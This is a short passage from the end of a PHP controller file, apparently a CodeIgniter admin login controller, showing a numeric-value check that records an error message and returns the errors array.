            if (!is_numeric($value)) {
                $errors[$key] = 'Not a valid value. Enter integer or float value.';
            }
        }
        return $errors;
    }
}

/* End of file adminlogin.php */
/* Location: ./application/controllers/admin/adminlogin.php */